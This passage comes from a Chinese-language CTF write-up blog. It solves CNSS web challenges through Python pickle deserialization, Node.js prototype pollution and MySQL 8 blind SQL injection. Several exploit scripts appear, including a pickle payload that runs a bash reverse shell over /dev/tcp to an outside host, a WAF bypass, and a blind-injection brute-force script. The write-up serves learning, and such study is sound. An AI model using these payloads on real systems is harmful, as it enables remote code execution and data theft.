class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;c__main__</span><br><span class="hljs-string">buyInfo</span><br><span class="hljs-string">(c__main__</span><br><span class="hljs-string">Hi</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">NAME</span><br><span class="hljs-string">cbuyInfo</span><br><span class="hljs-string">MONEY</span><br><span class="hljs-string">o-.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><span class="hljs-built_in">print</span>(pickle.loads(data).NAME, pickle.loads(data).MONEY)<br><br>url = <span class="hljs-string">f&quot;https://cnss-flag-shop-d22515ddfd9086fbb6b0c41c686a25c3.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs opcode">b&quot;&quot;&quot;c__main__<br>buyInfo<br>(c__main__<br>Hi<br>cbuyInfo<br>NAME<br>cbuyInfo<br>MONEY<br>o0.<br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="/posts/43716/image-20231019171808844.png" alt="image-20231019171808844"></p><p>解释一下这一坨</p><ol><li>手写<code>c</code>指令获得全局变量<code>__main__.buyInfo</code></li><li><code>(</code>标记mark压入栈</li><li>再用<code>c</code>指令引入<code>__main__.Hi</code></li><li><code>c</code>引入<code>buyInfo.NAME</code>和<code>buyInfo.MONEY</code></li><li><code>o</code>寻找栈中的上一个MARK（3），以之间的第一个数据<code>__main__.Hi</code>为callable，第2个到第3个数据为参数，执行该函数（或实例化一个对象）</li><li><code>0</code>丢弃栈（可以不写，但是会报警告：<code>stack not empty after STOP</code>，<del>也可以放在1和2之间，不知道为什么</del></li><li><code>.</code>结束</li></ol><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><p>–来自<a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_r1ch_k1d5&#125;</code></font></center></strong></em></p><h2 id="Mid-🔪-CNSS娘の自助Flag商店"><a href="#Mid-🔪-CNSS娘の自助Flag商店" class="headerlink" title="[Mid+] 🔪 CNSS娘の自助Flag商店"></a>[Mid+] 🔪 CNSS娘の自助Flag商店</h2><p>也是 pickle</p><p>同样 <strong>&#x2F;code</strong> 下载源码</p><p><em><strong>buyInfo.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>MONEY = <span class="hljs-number">2000</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():<br>    <span class="hljs-keyword">global</span> NAME, MONEY<br>    NAME = <span class="hljs-string">&quot;Rich&quot;</span><br>    MONEY = <span class="hljs-number">2000</span><br><br></code></pre></td></tr></table></figure></blockquote><p><em><strong>main.py</strong></em></p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> buyInfo<br><br>app = flask.Flask(__name__)<br><span class="hljs-comment"># flag is in /flag.txt</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    user = flask.request.args.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;View code in /code to buy flag.&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> user.upper():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br>    user = pickle.loads(user.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">if</span> user == Hi(buyInfo.NAME, buyInfo.MONEY):<br>        buyInfo.reset()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;你说得对，但是上次CNSS娘被你骗了之后很伤心，把商店改成了自助flag商店，你得自己找flag&#x27;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;臭要饭的别挡我财路&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code</span>():<br>    file = <span class="hljs-string">&#x27;code.zip&#x27;</span><br>    <span class="hljs-keyword">return</span> flask.send_file(file, mimetype=<span class="hljs-string">&#x27;application/zip&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br><br></code></pre></td></tr></table></figure></blockquote><p>同样，用<code>/user?</code>请求且过滤了<code>R</code>命令</p><p>但这题不需要<code>user == Hi(buyInfo.NAME, buyInfo.MONEY):</code></p><p>因为<code>picke.loads()</code>在比较之前就执行了opcode</p><p>那就直接上一题，除了<code>R</code>之外的2个RCE选1个就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> buyInfo<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hi</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, money</span>):<br>        self.name = name<br>        self.money = money<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> self.name == other.name <span class="hljs-keyword">and</span> self.money == other.money<br><br><br>data = <span class="hljs-string">b&quot;&quot;&quot;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&quot;bash -i &gt;`&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1&quot;</span><br><span class="hljs-string">o.&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(urllib.parse.quote(data))<br>url = <span class="hljs-string">f&quot;https://cnss-self-help-flag-shop-62058b9d09f9929106bff019ac365627.ctf.hurrison.com/?user=<span class="hljs-subst">&#123;urllib.parse.quote(data)&#125;</span>&quot;</span><br>response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url)<br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-comment"># pickle.loads(data)</span><br><span class="hljs-built_in">print</span>(pickletools.dis(data))<br><br></code></pre></td></tr></table></figure><p>是不是很简单😡，但是py的编码问题搞了我很久，讨厌py</p><p>反弹shell秒了，<strong>但是千万记得开端口</strong>（为了写一题花￥95，哭了</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;fl4g_f0r_c1ev3r_k1ds&#125;</code></font></center></strong></em></p><h2 id="Mid-🏭-EzPollution-pre"><a href="#Mid-🏭-EzPollution-pre" class="headerlink" title="[Mid+] 🏭 EzPollution_pre"></a>[Mid+] 🏭 EzPollution_pre</h2><p>嘿嘿，原型链，nodejs太好玩了</p><p>之前没接触过，开搜</p><blockquote><p>上资料：</p><ul><li><a href="https://juejin.cn/post/6984678359275929637">一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链 - JavaScript | MDN (mozilla.org)</a></li></ul></blockquote><p>简单了解了一下，</p><blockquote><p>现在我们知道了，当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p></blockquote><p>看文字好像有点抽象，我们来try try看</p><p><img src="/posts/43716/image-20231019175923135.png" alt="image-20231019175923135"></p><p>可以看到a一直都是个空对象</p><p>但是我们通过增加继承关系mm</p><blockquote><p>当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</p></blockquote><p>所以a.mm返回了原型上的属性</p><p>贴一下源码</p><p><strong>login.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value</span>) &#123;<br>  <span class="hljs-keyword">const</span> blacklistRegex = <span class="hljs-regexp">/(exec|load)/i</span><br>  <span class="hljs-keyword">if</span> (blacklistRegex.<span class="hljs-title function_">test</span>(value)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">/* GET home page.  */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(), <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span><br>  <span class="hljs-keyword">let</span> user = &#123;&#125;<br>  utils.<span class="hljs-title function_">copy</span>(user, req.<span class="hljs-property">body</span>)<br>  <span class="hljs-keyword">if</span> (secert.<span class="hljs-property">psych</span> === <span class="hljs-string">&#x27;p5ych&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">waf</span>(secert.<span class="hljs-property">eva1</span>)) &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">seval</span>(secert.<span class="hljs-property">eva1</span>))<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;hehe,,&#x27;</span>)<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<br>      <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user),<br>    &#125;)<br>  &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router<br><br></code></pre></td></tr></table></figure></blockquote><p>对于这题</p><ul><li>要使<code>secret.psych == &#39;p5ych&#39;</code>，但是secret是个空对象，所以就要用到原型链</li><li>但login.js中并没有明显的原型链操作，这时我们注意到<code>utils.copy(user, req.body)</code>，翻一下utils的源码</li></ul><p><strong>common.js</strong></p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>观察copy函数，如果当<code>key</code>为<code>__proto__</code>时，是不是就完成了一次原型链污染，实践一下</p><p><img src="/posts/43716/image-20231019191410727.png" alt="image-20231019191410727"></p><p>发现污染成功，芜湖~~</p><p>接下来就比较简单了，因为<strong>一个环境只能污染一次</strong>，所以先本地运行一下试一下（<strong>记得搭一下nodejs环境</strong></p><p><img src="/posts/43716/image-20231019191600257.png" alt="image-20231019191600257"></p><p>打开BurpSuite抓包，点击登录</p><p><img src="/posts/43716/image-20231019220831796.png" alt="image-20231019220831796"></p><p>修改post参数，放行</p><p><img src="/posts/43716/image-20231019234339420.png" alt="image-20231019234339420"></p><p>得到回显</p><p><img src="/posts/43716/image-20231019234359250.png" alt="image-20231019234359250"></p><p><strong>需要注意的点</strong>：</p><ul><li>源码中过滤了<code>exec</code>和<code>load</code>，所以可以使用<code>+</code>逃过waf</li><li>这个回显的地方要慢慢调，好崩溃😒😒</li></ul><p>本地调好了，那就上环境，如法炮制一下，得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;v2ry_ea5y_N0dejs&#125;</code></font></center></strong></em></p><h2 id="Hard-📀-newsql"><a href="#Hard-📀-newsql" class="headerlink" title="[Hard] 📀 newsql"></a>[Hard] 📀 newsql</h2><p><del>我才不会告诉你这题我是手注的</del></p><p>如题sql注入，经过提示得到这是sql8.0的特性注入</p><p>资料：</p><blockquote><p><a href="https://blog.csdn.net/HBohan/article/details/119757059">【网安干货】MySQL8新特性注入技巧_mysql values row_IT老涵的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/118726022">【精选】Pwnhub2021七月赛NewSql（mysql8注入）_mysql8 注入 ctf_bfengj的博客-CSDN博客</a></p></blockquote><p>得知sql8.0多了<code>Table</code>和<code>Value</code>的语法</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]<br></code></pre></td></tr></table></figure><p>当然table也有几个比较奇怪的问题：</p><ul><li>符号比较（&lt;符号的问题，在爆最后一位时与前面不同</li><li>大小写问题（坑死我了，<strong>用binary’’来解决</strong></li><li>详情看资料</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]<br>row_constructor_list:<br>    ROW(value_list)[，ROW(value_list)][，...]<br><br>value_list:<br>    value[，value][，...]<br><br>column_designator:<br>    column_index<br># 但这题我没用到value，不太懂具体用法<br></code></pre></td></tr></table></figure></blockquote><p>以及新的表<code>information_schema.TABLESPACES_EXTENSIONS</code></p><p><code>information_schema.TABLESPACES_EXTENSIONS</code>一次性储存了数据库名和表名</p><p>不多说，上手实操才是真理</p><p>输入<code>1 and 1=1 #</code>正常回显 </p><p>而<code>1 and 1=2 #</code>不回显</p><p>找到注入点，尝试<code>order by</code>，<code>union</code>，<code>select</code>发现都被过滤了</p><p>那就靠猜的吧</p><p><code>id=1 and (&#39;&#39;,&#39;&#39;)&lt;=(table information_schema.TABLESPACES_EXTENSIONS limit 0,1) #</code>时有回显，所以有两列</p><p>当时写完之后才想起来可以用脚本，头铁😢😢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//不如手注</span><br><br><span class="hljs-keyword">var</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sync-request&#x27;</span>)<br><span class="hljs-keyword">let</span> arr = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">45</span>; j &lt; <span class="hljs-number">126</span>; j++) &#123;<br>    arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j)<br>    <span class="hljs-comment">// console.log(arr.join(&#x27;&#x27;))</span><br>    <span class="hljs-comment">// url = `http://124.221.34.13:55553/?id=1 and (binary&#x27;$&#123;arr.join(&#x27;&#x27;)&#125;&#x27;,&#x27;&#x27;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #`</span><br>    url = <span class="hljs-string">`http://124.221.34.13:55553/?id=1 and (&#x27;9&#x27;,binary&#x27;<span class="hljs-subst">$&#123;arr.join(</span></span><br><span class="hljs-subst"><span class="hljs-string">      <span class="hljs-string">&#x27;&#x27;</span></span></span><br><span class="hljs-subst"><span class="hljs-string">    )&#125;</span>&#x27;)&lt;(table cn55 limit 8,1) #`</span><br>    <span class="hljs-keyword">var</span> res = <span class="hljs-title function_">request</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, url, &#123;<br>      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>,<br>    &#125;)<br>    <span class="hljs-comment">//console.log(String.fromCharCode(j - 1))</span><br>    arr[i] = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> (<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;psych&#x27;</span>) &amp;&amp;<br>      !res.<span class="hljs-title function_">getBody</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>).<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>) &amp;&amp;<br>      j != <span class="hljs-number">92</span><br>    ) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i, <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>))<br>      arr[i] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(j - <span class="hljs-number">1</span>)<br>      <span class="hljs-keyword">break</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!arr[i]) &#123;<br>    arr[i - <span class="hljs-number">1</span>] = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(arr[i - <span class="hljs-number">1</span>].<span class="hljs-title function_">charCodeAt</span>() + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">break</span><br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>一个个试过去</p><p><code>?id=1 and (binary&#39;$&#123;arr.join(&#39;&#39;)&#125;&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 10,1) #</code></p><p>库&#x2F;表</p><table><thead><tr><th align="center">id</th><th align="center">name</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">mysql</td></tr><tr><td align="center">2</td><td 